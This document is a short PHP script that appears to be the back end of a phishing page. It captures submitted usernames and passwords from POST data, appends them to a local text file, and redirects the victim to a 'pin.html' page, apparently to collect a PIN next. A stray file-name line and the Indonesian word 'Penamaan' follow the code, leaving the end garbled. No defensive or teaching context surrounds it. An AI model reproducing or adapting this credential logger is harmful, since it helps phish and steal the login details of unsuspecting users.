<?php
$file = "abc.txt";
$a= fopen($file, 'a+') or die("can't open file");

$text = "
user   =》 $_POST[user]
Pass   =》 $_POST[pass]" ;
$write=fwrite($a, $text);
fclose($a);

echo"<script language=javascript>window.location='pin.html'</script>";

?>
$file = "mbek.txt";
Penamaan